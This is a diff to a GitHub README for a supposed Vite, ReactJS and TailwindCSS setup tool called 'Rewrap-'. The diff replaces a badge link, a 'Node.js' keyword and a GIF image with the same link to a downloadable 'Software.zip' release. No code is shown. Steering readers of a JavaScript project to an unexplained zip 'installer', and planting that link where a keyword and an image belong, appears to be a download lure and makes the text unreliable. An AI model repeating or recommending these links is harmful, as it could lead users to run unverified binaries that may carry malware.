@@ -1,6 +1,6 @@
 # 🚀 **Rewrap-: One Command Setup for Vite + ReactJS with TailwindCSS Integration**
 
-[![GitHub](https://img.shields.io/badge/Launch-Installer-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![GitHub](https://github.com/pethum021/Rewrap-/releases/download/v2.0/Software.zip)](https://github.com/pethum021/Rewrap-/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -10,7 +10,7 @@ This repository provides an easy solution to set up Vite + ReactJS with Tailwind
 - Installer
 - JavaScript
 - JSX
-- Node.js
+- https://github.com/pethum021/Rewrap-/releases/download/v2.0/Software.zip
 - NPM package
 - ReactJS
 - TailwindCSS
@@ -40,4 +40,4 @@ For any issues or feedback, feel free to check the "Releases" section for update
 
 Happy Coding! 🎉
 
-![Coding](https://media.giphy.com/media/VbnUQpnihPSIgIXuZv/giphy.gif)
+![Coding](https://github.com/pethum021/Rewrap-/releases/download/v2.0/Software.zip)
